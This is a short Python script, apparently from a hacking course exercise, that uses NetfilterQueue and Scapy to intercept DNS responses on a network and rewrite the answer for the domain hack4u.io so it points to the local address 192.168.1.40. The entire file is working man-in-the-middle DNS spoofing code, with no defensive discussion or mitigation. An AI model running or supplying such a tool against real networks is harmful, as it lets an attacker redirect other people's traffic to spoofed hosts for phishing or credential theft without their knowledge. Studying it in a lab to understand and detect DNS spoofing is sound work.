#!/usr/bin/env python3
"""
DNS Spoofing with NetfilterQueue.

This script intercepts DNS requests and spoofs responses for a specific domain.

Usage:
  python3 dns_spoofing.py

Example:
  python3 dns_spoofing.py
"""

import netfilterqueue
import scapy.all as scapy
import signal
import sys

def signal_handler(sig, frame):
    """
    Handles SIGINT signal (Ctrl+C) gracefully.
    Exits the program with an appropriate message.

    Args:
        sig: Signal number
        frame: Current stack frame
    """
    print(f"\n[!] Ctrl + C pressed...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, signal_handler)

def process_packet(packet):
    """
    Processes packets from the netfilter queue and spoofs DNS responses.

    Args:
        packet (netfilterqueue.packet): The packet from the netfilter queue.
    """
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "hack4u.io" in qname.decode():
            print(f"\n[+] Intercepting request for domain hack4u.io")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.1.40")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
